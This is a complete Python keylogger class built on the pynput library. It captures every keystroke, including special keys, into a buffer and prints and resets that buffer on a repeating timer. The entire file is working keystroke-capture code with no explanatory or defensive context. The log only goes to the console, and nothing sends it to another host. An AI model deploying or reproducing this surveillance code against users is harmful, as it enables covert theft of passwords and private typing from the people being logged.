import pynput.keyboard
import threading


class Keylogger:
    def __init__(self, time_interval):
        self.log = ""
        self.interval = time_interval

    def addLog(self, string):
        self.log = self.log + string

    def keyPress(self, key):
        try:
            currentKey = str(key.char)
        except AttributeError:
            if key == key.space:
                currentKey = " "
            else:
                currentKey = " " + str(key) + " "
        self.addLog(currentKey)

    def report(self):
        print(self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def start(self):
        keyboardListener = pynput.keyboard.Listener(on_press=self.keyPress)
        with keyboardListener:
            self.report()
            keyboardListener.join()
